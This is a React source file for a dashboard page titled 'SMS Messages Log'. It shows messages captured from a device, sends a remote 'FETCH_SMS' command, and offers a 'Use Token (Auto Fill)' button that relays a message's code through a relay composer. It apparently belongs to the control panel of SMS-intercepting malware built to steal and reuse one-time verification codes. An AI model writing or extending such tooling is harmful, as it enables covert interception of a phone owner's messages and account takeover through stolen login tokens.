import React from 'react';
import { RefreshCw } from 'lucide-react';
import { useDashboard } from '../context/DashboardContext';

export default function SmsPage() {
  const { filteredSms, openRelayComposer, sendCommand } = useDashboard();

  return (
    <div className="glass-panel">
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
        <h3 style={{ fontSize: '18px', fontWeight: '700' }}>SMS Messages Log</h3>
        <button className="btn btn-outline" onClick={() => sendCommand('FETCH_SMS')}>
          <RefreshCw size={14} /> Request Latest SMS
        </button>
      </div>

      <div className="table-container">
        <table className="data-table">
          <thead>
            <tr>
              <th>Address / Sender</th>
              <th>Body Message</th>
              <th>Date (Device Local)</th>
              <th>Captured Time</th>
              <th>Action</th>
            </tr>
          </thead>
          <tbody>
            {filteredSms.length === 0 ? (
              <tr>
                <td colSpan="5" style={{ textAlign: 'center', color: 'var(--color-text-muted)', padding: '40px' }}>
                  No SMS messages found matching this query
                </td>
              </tr>
            ) : (
              filteredSms.map((sms, index) => (
                <tr key={index}>
                  <td style={{ fontWeight: '700', color: 'var(--accent-cyan)', whiteSpace: 'nowrap' }}>
                    {sms.address}
                  </td>
                  <td style={{ maxWidth: '400px', wordBreak: 'break-word', color: 'var(--color-text-main)' }}>
                    {sms.body}
                  </td>
                  <td style={{ color: 'var(--color-text-muted)', whiteSpace: 'nowrap' }}>
                    {new Date(sms.date).toLocaleString()}
                  </td>
                  <td style={{ color: 'var(--color-text-darker)', whiteSpace: 'nowrap' }}>
                    {new Date(sms.received_at).toLocaleTimeString()}
                  </td>
                  <td>
                    <button
                      className="btn btn-outline"
                      style={{ padding: '8px 10px' }}
                      onClick={() => openRelayComposer('sms', sms)}
                    >
                      Use Token (Auto Fill)
                    </button>
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
